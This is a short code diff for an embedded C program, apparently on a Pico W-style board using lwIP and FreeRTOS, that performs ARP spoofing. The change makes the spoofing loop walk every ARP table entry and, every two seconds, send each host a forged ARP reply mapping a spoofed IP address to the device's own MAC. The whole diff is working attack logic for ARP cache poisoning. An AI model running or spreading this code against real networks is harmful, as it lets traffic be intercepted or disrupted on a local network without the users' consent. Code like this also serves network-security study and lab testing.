@@ -12,7 +12,6 @@
 #include "lwip/etharp.h"
 #include "lwip/raw.h"
 
-
 // Define the Ethernet ethertype for ARP
 #define ARP_PROTOCOL 0x0806
 
@@ -117,11 +116,15 @@ void main_task(__unused void *params)
         spoof_ipaddr = ipaddr;
     }
 
+    printf("Sending Spoof...");
     while (true) 
-    {     
-        if (etharp_get_entry(1, &ipaddr, &netif, &ethaddr)) 
+    {
+        for (entry_index = 0; entry_index < ARP_TABLE_SIZE; entry_index++)
         {
-            send_arp_reply(&cyw43_state.netif[0], &device_mac, ethaddr, &device_mac, spoof_ipaddr, &device_mac, &ip);
+            if (etharp_get_entry(entry_index, &ipaddr, &netif, &ethaddr)) 
+            {
+                send_arp_reply(&cyw43_state.netif[0], &device_mac, ethaddr, &device_mac, spoof_ipaddr, &device_mac, &ip);
+            }
         }
         vTaskDelay(2000); // Delay before sending the next message
     }
